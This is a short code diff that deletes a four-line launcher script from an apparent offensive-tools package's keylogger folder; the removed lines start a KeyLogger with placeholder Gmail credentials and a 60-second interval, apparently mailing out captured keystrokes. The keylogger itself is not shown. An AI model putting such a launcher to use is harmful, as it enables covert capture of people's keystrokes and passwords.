--- pyhtools/malwares/keylogger/dlogs.py
@@ -1,4 +1,0 @@
-from keylogger import KeyLogger
-
-key_logger = KeyLogger(email='yourgmailaccount', password='yourpassword', interval_in_secs=60)
-key_logger.run()
